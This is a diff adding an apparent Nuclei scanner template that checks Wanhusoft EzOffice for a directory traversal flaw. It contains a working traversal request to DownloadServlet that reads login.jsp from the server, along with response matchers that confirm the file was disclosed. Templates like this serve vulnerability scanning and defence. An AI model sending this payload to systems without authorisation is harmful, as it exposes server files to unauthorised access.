@@ -1,0 +1,24 @@
+id: wanhusoft-ezoffice-directory-traversal-cnvd-2021-34273
+info:
+  name: Wanhusoft EzOffice Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Directory traversal vulnerability in Wanhusoft EzOffice allows unauthorized access to sensitive files.
+  reference:
+    - http://124.223.89.192/archives/ezoffice01
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/DownloadServlet?modeType=2&path=html&FileName=..%5C..%5Clogin.jsp&name=123&fiewviewdownload=2&cd=inline&downloadAll=2"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "com.whir.component.util"
+          - "com.whir.component.config.ConfigReader.getFileServer"
+        part: body
